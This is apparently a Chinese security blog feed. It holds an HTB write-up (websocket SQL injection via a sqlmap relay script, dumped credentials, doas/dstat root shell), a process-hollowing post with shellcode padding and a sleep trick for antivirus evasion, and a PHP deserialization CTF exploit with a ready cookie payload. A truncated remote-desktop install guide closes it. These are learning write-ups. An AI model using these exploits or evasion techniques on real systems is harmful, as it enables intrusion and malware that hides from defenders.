class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs !">from http.server import SimpleHTTPRequestHandler<br>from socketserver import TCPServer<br>from urllib.parse import unquote, urlparse<br>from websocket import create_connection<br><br>ws_server = &quot;ws://soc-player.soccer.htb:9091/ws&quot;<br><br>def send_ws(payload):<br>ws = create_connection(ws_server)<br># If the server returns a response on connect, use below line<br>#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here<br><br># For our case, format the payload in JSON<br>message = unquote(payload).replace(&#x27;&quot;&#x27;,&#x27;\&#x27;&#x27;) # replacing &quot; with &#x27; to avoid breaking JSON structure<br>data = &#x27;&#123;&quot;id&quot;:&quot;%s&quot;&#125;&#x27; % message<br><br>ws.send(data)<br>resp = ws.recv()<br>ws.close()<br><br>if resp:<br>return resp<br>else:<br>return &#x27;&#x27;<br><br>def middleware_server(host_port,content_type=&quot;text/plain&quot;):<br><br>class CustomHandler(SimpleHTTPRequestHandler):<br>def do_GET(self) -&gt; None:<br>self.send_response(200)<br>try:<br>payload = urlparse(self.path).query.split(&#x27;=&#x27;,1)[1]<br>except IndexError:<br>payload = False<br><br>if payload:<br>content = send_ws(payload)<br>else:<br>content = &#x27;No parameters specified!&#x27;<br><br>self.send_header(&quot;Content-type&quot;, content_type)<br>self.end_headers()<br>self.wfile.write(content.encode())<br>return<br><br>class _TCPServer(TCPServer):<br>allow_reuse_address = True<br><br>httpd = _TCPServer(host_port, CustomHandler)<br>httpd.serve_forever()<br><br><br>print(&quot;[+] Starting MiddleWare Server&quot;)<br>print(&quot;[+] Send payloads in http://localhost:8081/?id=*&quot;)<br><br>try:<br>middleware_server((&#x27;0.0.0.0&#x27;,8081))<br>except KeyboardInterrupt:<br>pass<br></code></pre></td></tr></table></figure></li><li><p>執行後可訪問localhost:8081?id&#x3D;*<br><img src="https://i.imgur.com/yv0jq2g.png"></p></li></ul><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://localhost:8081/?id=1&quot;</span> <span class="hljs-params">--dbs</span> <span class="hljs-params">--batch</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/3CAhMn2.png"></p><ul><li>dump出密碼<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">player / PlayerOftheMatch2022<br></code></pre></td></tr></table></figure><img src="https://i.imgur.com/bNqQEnV.png"></li></ul><h3 id="ssh登入"><a href="#ssh登入" class="headerlink" title="ssh登入"></a>ssh登入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">利用剛剛的憑證登入player<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/nL1xylz.png"></p><h3 id="SUID-enumeration"><a href="#SUID-enumeration" class="headerlink" title="SUID enumeration"></a>SUID enumeration</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">find / -perm -u=s 2&gt;/dev/null<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>doas<br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/snapd/</span>snap-confine<br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/dbus-1.0/</span>dbus-daemon-launch-helper<br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/openssh/</span>ssh-keysign<br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/policykit-1/</span>polkit-agent-helper-<span class="hljs-number">1</span><br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/eject/</span>dmcrypt-get-device<br><span class="hljs-regexp">/usr/</span>bin/umount<br><span class="hljs-regexp">/usr/</span>bin/fusermount<br><span class="hljs-regexp">/usr/</span>bin/mount<br><span class="hljs-regexp">/usr/</span>bin/su<br><span class="hljs-regexp">/usr/</span>bin/newgrp<br><span class="hljs-regexp">/usr/</span>bin/chfn<br><span class="hljs-regexp">/usr/</span>bin/sudo<br><span class="hljs-regexp">/usr/</span>bin/passwd<br><span class="hljs-regexp">/usr/</span>bin/gpasswd<br><span class="hljs-regexp">/usr/</span>bin/chsh<br><span class="hljs-regexp">/usr/</span>bin/at<br><span class="hljs-regexp">/snap/</span>snapd<span class="hljs-regexp">/17883/u</span>sr<span class="hljs-regexp">/lib/</span>snapd/snap-confine<br><span class="hljs-regexp">/snap/</span>core20<span class="hljs-regexp">/1695/u</span>sr<span class="hljs-regexp">/bin/</span>chfn<br><span class="hljs-regexp">/snap/</span>core20<span class="hljs-regexp">/1695/u</span>sr<span class="hljs-regexp">/bin/</span>chsh<br><span class="hljs-regexp">/snap/</span>core20<span class="hljs-regexp">/1695/u</span>sr<span class="hljs-regexp">/bin/g</span>passwd<br><span class="hljs-regexp">/snap/</span>core20<span class="hljs-regexp">/1695/u</span>sr<span class="hljs-regexp">/bin/m</span>ount<br><span class="hljs-regexp">/snap/</span>core20<span class="hljs-regexp">/1695/u</span>sr<span class="hljs-regexp">/bin/</span>newgrp<br><span class="hljs-regexp">/snap/</span>core20<span class="hljs-regexp">/1695/u</span>sr<span class="hljs-regexp">/bin/</span>passwd<br><span class="hljs-regexp">/snap/</span>core20<span class="hljs-regexp">/1695/u</span>sr<span class="hljs-regexp">/bin/</span>su<br><span class="hljs-regexp">/snap/</span>core20<span class="hljs-regexp">/1695/u</span>sr<span class="hljs-regexp">/bin/</span>sudo<br><span class="hljs-regexp">/snap/</span>core20<span class="hljs-regexp">/1695/u</span>sr<span class="hljs-regexp">/bin/um</span>ount<br><span class="hljs-regexp">/snap/</span>core20<span class="hljs-regexp">/1695/u</span>sr<span class="hljs-regexp">/lib/</span>dbus-<span class="hljs-number">1.0</span>/dbus-daemon-launch-helper<br><span class="hljs-regexp">/snap/</span>core20<span class="hljs-regexp">/1695/u</span>sr<span class="hljs-regexp">/lib/</span>openssh/ssh-keysign<br></code></pre></td></tr></table></figure><h3 id="doas指令提權"><a href="#doas指令提權" class="headerlink" title="doas指令提權"></a>doas指令提權</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs !">先找尋他的設定檔 一開始是找/etc/doas.conf但沒成功<br>用find去尋找<br><br>find / -iname &quot;doas.conf&quot; 2&gt;/dev/null<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">/usr/local/etc/doas.conf<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/A7pp3vN.png"></p><ul><li>dstat搭配doas<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">查看dstat的man page<br>發現可以執行外部腳本插件<br></code></pre></td></tr></table></figure><img src="https://i.imgur.com/PeeS2xC.png"></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">因為/usr/share/dstat沒有權限寫入<br>改用/usr/local/share/dstat/<br></code></pre></td></tr></table></figure><ul><li><p>dstat_priv.py</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-keyword">import</span> subprocess<br><br><span class="hljs-title">subprocess</span>.run([<span class="hljs-string">&quot;bash&quot;</span>])<br></code></pre></td></tr></table></figure></li><li><p>利用doas執行dstat並附上插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">doas /usr/bin/dstat --priv<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/qYSR27Z.png"></p></li></ul><h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><ul><li><p>user</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">35907f92e87694451271ef44e476bcb8<br></code></pre></td></tr></table></figure></li><li><p>root</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">8a8620bfc3502b614ccb3aa46ff7de90<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/C0fIZJ1.png"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>HTB</category>
      
      <category>靶機</category>
      
    </categories>
    
    
    <tags>
      
      <tag>websocket</tag>
      
      <tag>websocket SQLi</tag>
      
      <tag>tiny</tag>
      
      <tag>doas</tag>
      
      <tag>dstat</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>APT武器庫打造計畫 &amp;&amp; entry point 劫持 (1)</title>
    <link href="/2022/12/07/APT%E6%AD%A6%E5%99%A8%E5%BA%AB1/"/>
    <url>/2022/12/07/APT%E6%AD%A6%E5%99%A8%E5%BA%AB1/</url>
    
    <content type="html"><![CDATA[<h1 id="APT武器庫打造計畫-amp-amp-entry-point-劫持-1"><a href="#APT武器庫打造計畫-amp-amp-entry-point-劫持-1" class="headerlink" title="APT武器庫打造計畫 &amp;&amp; entry point 劫持 (1)"></a>APT武器庫打造計畫 &amp;&amp; entry point 劫持 (1)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs !">最近在練習dll injection、bypassAV一些規避技術，<br>有朋友提到不能使用managed程式去做繞過，否則一定被查殺，<br>於是決定用C++是看看練習刻一個process hollowing出來，<br>技術不到位，可能會有很多錯誤觀念XDD<br></code></pre></td></tr></table></figure><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs !">通過CreateProcess創建進程，傳入參數CREATE_SUSPENDED使進程掛起<br>通過NtQueryInformationProcess 找出imagebase<br>從ImageBase讀取PE頭信息，再從NTheader中獲取entry point RVA，加上獲取的RVA得到entry point address。<br>通過WriteProcessMemory向內存寫入payload<br>通過ResumeThread喚醒進程，執行payload<br></code></pre></td></tr></table></figure><h3 id="建立一個-Suspended-Process-，-此為注入的目標-Process"><a href="#建立一個-Suspended-Process-，-此為注入的目標-Process" class="headerlink" title="建立一個 Suspended Process ， 此為注入的目標 Process"></a>建立一個 Suspended Process ， 此為注入的目標 Process</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">使用 CreateProcessA 建立Process<br></code></pre></td></tr></table></figure><ul><li>CreateProcessA<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs !">BOOL CreateProcessA(<br>  [in, optional]      LPCSTR                lpApplicationName, //應用程式名稱<br>  [in, out, optional] LPSTR                 lpCommandLine, //命令行字符串<br>  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes, //Process安全屬性<br>  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes, //Thread安全屬性<br>  [in]                BOOL                  bInheritHandles, //是否繼承父進程的屬性<br>  [in]                DWORD                 dwCreationFlags, //創建標誌<br>  [in, optional]      LPVOID                lpEnvironment, //指向新環境塊的Pointer<br>  [in, optional]      LPCSTR                lpCurrentDirectory, //指向當前目錄名的Pointer<br>  [in]                LPSTARTUPINFOA        lpStartupInfo, //傳遞給新進程的信息<br>  [out]               LPPROCESS_INFORMATION lpProcessInformation //新進程返回的信息<br>);<br></code></pre></td></tr></table></figure></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs !">使用 CreateProcessA 建立 Process，其中有個重點是第六個參數 dwCreationFlags 必須是 CREATE_SUSPENDED (0x4)，因為需要它維持在初始狀態，讓我們能夠對其中的記憶體進行修改。<br><br>建立了目標 Process後，並把它的記憶體竄改成我們自己的程式後，呼叫 ResumeThread 就可以讓它恢復執行。<br><br>有了目標 Process 的 Handle，就可以取得 PEB，裡面包含後面步驟需要用到的 ImageBaseAddress。<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/8galwew.png"></p><ul><li>LPSTARTUPINFOA &amp;&amp; PROCESS_INFORMATION<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">LPSTARTUPINFOA si是一個指向STARTUPINFOA結構的指標，指定新進程的窗口屬性。 <br>PROCESS_INFORMATION proc_info是一個包含新進程及其主線程信息的結構。它通常用於存儲新進程的進程和線程句柄。<br></code></pre></td></tr></table></figure></li></ul><h3 id="取得imageBase"><a href="#取得imageBase" class="headerlink" title="取得imageBase"></a>取得imageBase</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs !">NtQueryInformationProcess 函數用於查詢有關特定過程的信息，並將結果存儲在 pbi 結構中。<br><br>第一個參數是一個過程句柄，第二個參數是 ProcessBasicInformation 枚舉值，第三個參數是一個指向 PROCESS_BASIC_INFORMATION 結構的指針，第四個參數是結構的大小，第五個參數是一個指向存儲結果的指針。<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/TjU9iGb.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">dt !_PEB 結構資訊<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/rPu7dw1.png"></p><ul><li>PEB + 0x10位置即是process的imagebase address<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs !">透過ReadProcessMemory來取得指定記憶體內容<br>LONGLONG imageBaseOffset = (LONGLONG)pbi.PebBaseAddress + 0x10;<br><br>PEB位置加上0x10定位到imagebase<br></code></pre></td></tr></table></figure></li></ul><h3 id="獲取Header頭"><a href="#獲取Header頭" class="headerlink" title="獲取Header頭"></a>獲取Header頭</h3><p><img src="https://i.imgur.com/1Q9RX67.png"></p><h3 id="Shellcode-加密-amp-amp-Sleep-程式"><a href="#Shellcode-加密-amp-amp-Sleep-程式" class="headerlink" title="Shellcode 加密 &amp;&amp; Sleep 程式"></a>Shellcode 加密 &amp;&amp; Sleep 程式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs !">目前是塞垃圾byte給shellcode<br>並且執行時先讓程式做sleep <br>有些啟發式防毒會將程式丟到模擬器去執行，遇到延遲會快進，<br></code></pre></td></tr></table></figure><ul><li><p>加密方式很多種，目前還在測試中，於是就隨便塞垃圾byte..</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs !">unsigned char plain[] = &quot;\xfc\x48\x83\xe4\xf0<br>unsigned char buf[4 * sizeof(plain)];<br><br>    int j = 0;<br><br>    for (int i = 0; i &lt; 4 * sizeof(plain); i++) &#123;<br><br>        if (i % 4 == 0) &#123;<br>            buf[i] = plain[j];<br>            j++;<br>        &#125;<br>        else &#123;<br>            buf[i] = rand() &amp; 15;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure></li><li><p>sleep</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs !">auto t1 = std::chrono::system_clock::now();<br>std::this_thread::sleep_for(std::chrono::seconds(2));<br>auto t2 = std::chrono::system_clock::now();<br>auto elapsed_time = std::chrono::duration_cast&lt;std::chrono::seconds&gt;(t2 - t1).count();<br>std::cout &lt;&lt; &quot;Elapsed time: &quot; &lt;&lt; elapsed_time &lt;&lt; &quot; seconds&quot; &lt;&lt; std::endl;<br>if (elapsed_time &lt; 1.5) &#123;<br>    return;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">目前還有太多東西不了解，還需要更多的嘗試才會有更多收穫，<br>繼續學習zzz<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>APT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>APT</tag>
      
      <tag>武器庫</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WEB-InfoSecCTF2022-Message of the day</title>
    <link href="/2022/12/04/WEB-InfoSecCTF2022-Message%20of%20the%20day/"/>
    <url>/2022/12/04/WEB-InfoSecCTF2022-Message%20of%20the%20day/</url>
    
    <content type="html"><![CDATA[<h1 id="Message-of-the-Day"><a href="#Message-of-the-Day" class="headerlink" title="Message of the Day"></a>Message of the Day</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">題目首頁顯示 You are not allowed to access.<br>先用dirsearch爆破目錄<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/ghSzYSu.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">發現backup.zip<br>裡面有三個檔案 client.php read.php index.php<br></code></pre></td></tr></table></figure><ul><li><p>index.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs !">&lt;?php<br><br>include(&#x27;client.php&#x27;);<br><br>function getIP()<br>&#123;<br>    if (!empty($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]))<br>    &#123;<br>      $ip=$_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];<br>    &#125;<br>    else<br>    &#123;<br>      $ip=$_SERVER[&#x27;REMOTE_ADDR&#x27;];<br>    &#125;<br>    return $ip;<br>&#125;<br><br>if (getIP() == &#x27;127.0.0.1&#x27;) &#123;<br>if (!isset($_COOKIE[&#x27;client&#x27;])) &#123;<br>setcookie(&quot;client&quot;, base64_encode(serialize(new Client(&#x27;Guest&#x27;))));<br>&#125; else &#123;<br>unserialize(base64_decode($_COOKIE[&#x27;client&#x27;]));<br>&#125;<br>&#125;<br>else &#123;<br>header(&#x27;HTTP/1.0 403 Forbidden&#x27;);<br>    die(&#x27;You are not allowed to access.&#x27;);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure></li><li><p>read.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs !">&lt;?php<br>class Read &#123;<br><br>// Still in development phase<br><br>private $file_name;<br><br>public function print($val) &#123;<br>include($this-&gt;file_name);<br>echo $val;<br>&#125;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure></li><li><p>client.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs !">&lt;?php<br>include(&#x27;read.php&#x27;);<br><br>class Client &#123;<br><br>private $name;<br>private $tmp;<br><br>function __construct($name) &#123;<br>$this-&gt;name = $name;<br>$this-&gt;tmp = new Message();<br>&#125;<br><br>function __destruct() &#123;<br>$this-&gt;tmp-&gt;print($this-&gt;name);<br>&#125;<br>&#125;<br><br>class Message &#123;<br><br>public function print($val) &#123;<br>echo &quot;Tigers and bears may be stronger predators, but wolves don&#x27;t perform in circus, &quot;. $val .&quot;!&quot;;<br>&#125;<br><br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">拿到三個文件的<span class="hljs-built_in">source</span> code<br>首先會利用<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] 抓取使用者<br>使用者可控的header都不安全<br>可用X-Forwarded-For: 127.0.0.1 繞過<br><br>接著會對cookie裡面的內容做反序列化<br>unserialize(base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;client&#x27;</span>]));<br><br>會call Message的Print <span class="hljs-keyword">function</span><br>可改成<span class="hljs-built_in">read</span>的<span class="hljs-built_in">print</span> 並將file_name改成要include的檔案<br></code></pre></td></tr></table></figure><ul><li><p>exp.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs !">&lt;?php<br><br>class Read &#123;<br><br>    private $file_name = &#x27;/etc/motd&#x27;;<br><br>    public function print($val) &#123;<br>        include($this-&gt;file_name);<br>        echo $val;<br>    &#125;<br>&#125;<br><br>class Client &#123;<br><br>    private $name;<br>    private $tmp;<br><br>    function __construct($name) &#123;<br>        $this-&gt;name = $name;<br>        $this-&gt;tmp = new Read();<br>    &#125;<br><br>    function __destruct() &#123;<br>        $this-&gt;tmp-&gt;print($this-&gt;name);<br>    &#125;<br><br>&#125;<br><br>class Message &#123;<br><br>    public function print($val) &#123;<br>        echo &quot;Tigers and bears may be stronger predators, but wolves don&#x27;t perform in circus, &quot;. $val .&quot;!&quot;;<br>    &#125;<br><br>&#125;<br><br>$test = new Client(&#x27;/etc/passwd&#x27;);<br><br>$y = base64_encode(serialize($test));<br>echo $y;<br><br>?&gt;<br></code></pre></td></tr></table></figure></li><li><p>requests get flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs !">根據題意 推測為motd指令 將payload file_name給/etc/motd<br>Cookie: client=Tzo2OiJDbGllbnQiOjI6e3M6MTI6IgBDbGllbnQAbmFtZSI7czoxMToiL2V0Yy9wYXNzd2QiO3M6MTE6IgBDbGllbnQAdG1wIjtPOjQ6IlJlYWQiOjE6e3M6MTU6IgBSZWFkAGZpbGVfbmFtZSI7czo5OiIvZXRjL21vdGQiO319<br><br>X-Forwarded-For: 127.0.0.1<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/SeA8DWB.png"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PHP</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GCP安裝Chrome-Remote-Desktop</title>
    <link href="/2022/12/03/Chrome-Remote-Desktop/"/>
    <url>/2022/12/03/Chrome-Remote-Desktop/</url>
    
    <content type="html"><![CDATA[<h1 id="GCP-安裝-Chrome-Remote-Desktop"><a href="#GCP-安裝-Chrome-Remote-Desktop" class="headerlink" title="GCP 安裝 Chrome-Remote-Desktop"></a>GCP 安裝 Chrome-Remote-Desktop</h1><h2 id="環境"><a href="#環境" class="headerlink" title="環境"></a>環境</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">GCP N1<br>Ubuntu 22.04 LTS x86_64 <br></code></pre></td></tr></table></figure><h2 id="VPS安裝Chrome遠端桌面"><a href="#VPS安裝Chrome遠端桌面" class="headerlink" title="VPS安裝Chrome遠端桌面"></a>VPS安裝Chrome遠端桌面</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs !">wget https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb<br><br>sudo apt-get install --assume-yes ./chrome-remote-desktop_current_amd64.deb<br></code></pre></td></tr></table></figure><h2 id="安裝桌面環境"><a href="#安裝桌面環境" class="headerlink" title="安裝桌面環境"></a>安裝桌面環境</h2><ul><li><p>更新存儲庫</p><figure class="highlight 